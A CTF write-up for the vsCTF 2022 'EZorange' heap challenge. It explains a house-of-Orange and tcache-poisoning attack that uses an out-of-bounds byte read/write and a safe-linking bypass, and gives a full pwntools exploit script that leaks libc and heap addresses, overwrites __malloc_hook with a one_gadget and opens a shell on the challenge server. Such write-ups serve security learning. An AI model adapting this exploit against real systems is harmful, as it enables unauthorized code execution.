### EZorange

was a heap pwn challenge from vsCTF 2022

is starts as house of Orange (as the name hints)

the challenge has no possibility to free a chunk, we can only allocate a chunk of up to 0x1000 bytes, and edit it. 

The edit function is an oob read/write, we can use it to write or leak a byte at any offset from the beginning of the chunk.

As with the house of orange, we will reduce top_chunk, then allocate a 0x1000 chunk, that will free the top_chunk remaining chunk.

With that trick we can free two chunks that will go in the tcache.

Then we do a classic tcache poisonning with the oob r/w edit function,

and we overwrite __malloc_hook with a one gadget to get a shell.

The challenge is based on libc 2.32,  but the safe linking does not change anything, as we can leak the heap address with the oob r/w.



Here is the exploit commented.

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("./ezorange_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.32.so")

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]
onegadgets = one_gadget(libc.path, libc.address)

rop = ROP(exe)

host, port = "104.197.118.147", "10160"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

def buy(idx,size):
  p.sendlineafter('> ', '1')
  p.sendlineafter(': ', str(idx))
  p.sendlineafter(': ', str(size))

def modify(idx, cell, val=0):
  p.sendlineafter('> ', '2')
  p.sendlineafter(': ', str(idx)) 
  p.sendlineafter(': ', str(cell))
  p.recvuntil('Current value: ',drop=True)
  retval = int(p.recvuntil('\n',drop=True),10)
  if (val<256):
    p.sendlineafter('New value: ', str(val))
  else:
    p.sendlineafter('New value: ', '+')
  return retval

buy(0, 0x18)
modify(0, 26, 0)
buy(1, 0x1000)

leak = 0
for i in range(6):
  leak += modify(0, 32+i, 256)<<(i<<3)

print('libc leak = '+hex(leak))
libc.address = leak - 0x1c5c00
print('libc base = '+hex(libc.address))

buy(0, 0x100)

buy(1,0xce0)
# modify top_chunk size to 0x301
modify(1, 0xce8, 1)
modify(1, 0xce9, 3)
modify(1, 0xcea, 0)
# free 1st 0x2e0 chunk
buy(1,0x1000)

buy(0, 0x100)

buy(1,0xce0)
# modify top_chunk size to 0x301
modify(1, 0xce8, 1)
modify(1, 0xce9, 3)
modify(1, 0xcea, 0)
# free second 0x2e0 chunk
buy(1,0x1000)

def obfuscate(p, adr):
    return p^(adr>>12)

# leak heap fd pointer
leak2 = 0
for i in range(6):
  leak2 += modify(0, 0x44948+i, 256)<<(i<<3)

print('heap leak = '+hex(leak2))

# target to get allocation to (malloc_hook)
target= obfuscate(libc.sym['__malloc_hook'], (leak2+0x44d00))
# do tcache poisonning on second chunk
for i in range(6):
  modify(0, 0x44940+i, (target>>(i<<3))&0xff)

buy(1,0x2d0)
# second allocation will be on our target
buy(0,0x2d0)

onegadgets = one_gadget(libc.path, libc.address)
target = onegadgets[1]

# write onegadget to our target
for i in range(6):
  modify(0, i, (target>>(i<<3))&0xff)

# launch onegadget & got shell
buy(0,1)

p.interactive()
```

